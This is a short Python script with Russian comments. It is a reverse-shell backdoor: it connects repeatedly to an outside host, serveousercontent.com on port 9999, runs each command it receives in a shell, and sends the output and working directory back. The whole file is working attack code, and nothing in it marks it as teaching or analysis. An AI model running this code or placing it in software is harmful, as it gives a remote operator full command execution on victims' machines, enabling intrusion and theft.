import socket
import os
import subprocess

s = socket.socket() 

host = str("serveousercontent.com") #айпи/домен
port = 9999 #открытый порт
while True: #пробуем подключится к серверу, если нет подключения - идет повтор
    try:
        s.connect((host, port))
        break
    except:
        pass
#воспроизвод комманды, которую вы вписали
while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0: 
                
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                
                output_bytes = cmd.stdout.read() + cmd.stderr.read() 
                output_str = str(output_bytes, "utf-8")

                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
#закрывается соединение, если что-то не так.
s.close()
